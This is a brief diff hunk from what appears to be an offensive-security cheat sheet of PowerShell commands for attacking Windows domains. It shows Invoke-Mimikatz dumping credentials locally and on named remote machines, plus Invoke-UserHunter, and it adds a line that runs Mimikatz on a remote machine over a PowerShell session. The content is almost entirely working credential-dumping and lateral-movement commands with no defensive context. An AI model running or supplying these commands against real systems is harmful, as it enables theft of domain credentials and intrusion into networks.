@@ -51,6 +51,8 @@ Invoke-Mimikatz -DumpCreds
 Dump credentials on multiple remote machines.
 Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
 
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess #Run mimikatz on remote machine
+
 For user hunting:
 Invoke-UserHunter
 
